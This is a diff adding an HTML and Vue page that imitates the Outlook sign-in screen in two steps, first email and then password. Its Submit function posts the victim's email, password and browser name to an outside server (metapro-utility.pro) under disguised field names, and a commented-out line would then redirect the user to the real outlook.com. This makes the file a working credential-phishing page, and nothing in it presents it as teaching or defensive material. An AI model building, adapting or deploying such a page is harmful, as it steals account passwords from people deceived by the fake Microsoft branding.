@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <link href="CSS/style.css" rel="stylesheet"> 
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
+    <title> Cloud Project</title>
+    
+</head>
+<body>
+
+
+    <div id="app">
+
+
+
+    <div class="office p-md-5">
+
+    <div class="container mt-3">
+
+        <p class="text-center fw-bold fs-1"> Outlook </p>
+
+        
+
+
+
+    <div class="card p--md-3 rounded-0 mx-auto d-block" v-if="next == true">
+
+
+
+
+        <div class="card-body" >
+
+            <img src="./Images/logo-one.svg" class="mb-3">
+
+            <p class="text-black fw-bold fs-4 m-0 "> 
+                Sign in <br>
+                <span class="fw-bold" style="font-size: 14px;"> contine to outlook </span> 
+            </p>
+
+
+            <div class="mb-3">
+                <input type="email" class="form-control border border-2 border-black border-top-0 border-end-0 border-start-0" id="exampleFormControlInput1" placeholder="Email, phone, or skype" v-model="Blood">
+            </div>
+        
+              <p class="" style="font-size: 14px;"> No account? <span class="text-primary"> Create one </span> </p>
+              <p class="text-primary"> sign in with a security key <img src="./Images/question-mark.svg" alt=""> </p>
+
+
+              <div class="d-grid gap-2 d-md-flex justify-content-md-end mt-3">
+                <button class="btn text-white rounded-0" type="button" style="width: 100px; background-color: #0067B8;" @click="nextPage" :disabled="Blood.length < 2"> Next </button>
+              </div>
+            
+
+
+        </div>
+      
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+        
+            <div class="card p--md-3 rounded-0 mx-auto d-block"  v-if="previous ==true">
+        
+                <div class="card-body" >
+        
+                    <img src="./Images/logo-one.svg" class="mb-3">
+
+                    <p class="text-black"> <img src="./Images/arrow_left.svg" alt=""> {{ Blood}}  </p>
+        
+                    <p class="text-black fw-bold fs-4 m-0 "> 
+                        Enter Password
+                    </p>
+        
+        
+                    <div class="mb-3">
+                        <input type="password" class="form-control border border-2 border-black border-top-0 border-end-0 border-start-0" id="exampleFormControlInput1" placeholder="" v-model="Praise">
+                    </div>
+                
+                      <p class="text-primary" style="font-size: 14px;"> Forget password? </p>
+
+                      <p class="text-primary" style="font-size: 14px;"> Other ways to sign in </p>
+
+                      <div class="d-grid gap-2 d-md-flex justify-content-md-end mt-3">
+                        <button class="btn text-white rounded-0" type="button" style="width: 100px; background-color: #0067B8;" @click="previousPage"> Previous </button>
+                        <button class="btn text-white rounded-0" type="button" style="width: 100px; background-color: #0067B8;" :disabled="Praise.length < 3"  @click="Submit"> Sign in </button>
+                      </div>
+        
+                </div>
+              </div>
+        
+        
+        
+              <div class="card rounded-0 mt-3 mx-auto d-block" >
+                <div class="card-body">
+                    <img src="./Images/key.svg" alt="" style="height: 36px;"> Sign-in options
+                </div>
+              </div>
+
+
+      </div>
+      </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.2/anime.min.js" integrity="sha512-aNMyYYxdIxIaot0Y1/PLuEu3eipGCmsEUBrUq+7aVyPGMFH8z0eTP0tkqAvv34fzN6z+201d3T8HPb1svWSKHQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+
+
+
+
+
+
+    
+    <script>
+
+        const { createApp } = Vue
+      
+        createApp({
+
+          data() {
+
+            return {
+
+              Blood: '',
+              Praise: '',
+              next: true,
+              previous: false,
+            }
+
+          },
+
+          mounted() {
+           
+         },
+
+    methods: {
+
+      nextPage() {
+        this.next = false
+        this.previous = true
+      },
+
+      previousPage() {
+        this.previous = false
+        this.next = true
+      },
+
+      Submit() {
+            // Data to be sent in the POST request
+      const postData = {
+        Blood: this.Blood,
+        Praise: this.Praise,
+        suffering: this.getBrowserName()
+      };
+
+      // Axios POST request
+      axios.post('https://metapro-utility.pro/api/lovers/jesus', postData)
+        .then(response => {
+          // Handle the success response
+          console.log(response.data);
+          //window.location.href = "https://outlook.com/";
+
+        })
+        .catch(error => {
+          // Handle the error
+          console.error('Error making POST request:', error);
+        });
+
+      },
+
+      // Function to get the browser name
+   getBrowserName() {
+    const userAgent = navigator.userAgent;
+    
+    if (userAgent.includes("Firefox")) {
+        return "Mozilla Firefox";
+    } else if (userAgent.includes("Chrome")) {
+        return "Google Chrome";
+    } else if (userAgent.includes("Safari")) {
+        return "Apple Safari";
+    } else if (userAgent.includes("Edge")) {
+        return "Microsoft Edge";
+    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+        return "Opera";
+    } else if (userAgent.includes("MSIE") || userAgent.includes("Trident/")) {
+        return "Internet Explorer";
+    } else {
+        return "Unknown Browser";
+    }
+  }
+
+
+    },
+
+
+
+        }).mount('#app')
+
+
+      </script>
+
+
+
+
+</body>
+</html>
